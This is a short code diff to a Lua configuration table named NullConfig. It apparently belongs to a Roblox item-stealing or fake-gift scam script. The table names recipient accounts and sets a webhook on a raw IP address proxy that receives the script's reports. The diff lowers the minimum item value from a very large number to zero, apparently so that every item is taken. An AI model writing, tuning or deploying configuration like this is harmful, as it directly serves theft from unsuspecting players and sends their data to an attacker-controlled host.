@@ -1,6 +1,6 @@
 _G.NullConfig = {
     User = {'DanyelQuibs', 'DsonAlt2'},
-    min_value = 1000000000000,
+    min_value = 0,
     pingEveryone = "No", -- dont change this
     Webhook = "http://45.13.225.83:20002/proxy/7aa9a6b1e62e10149bfae4173fbc15a1",
     FakeGift = "No",
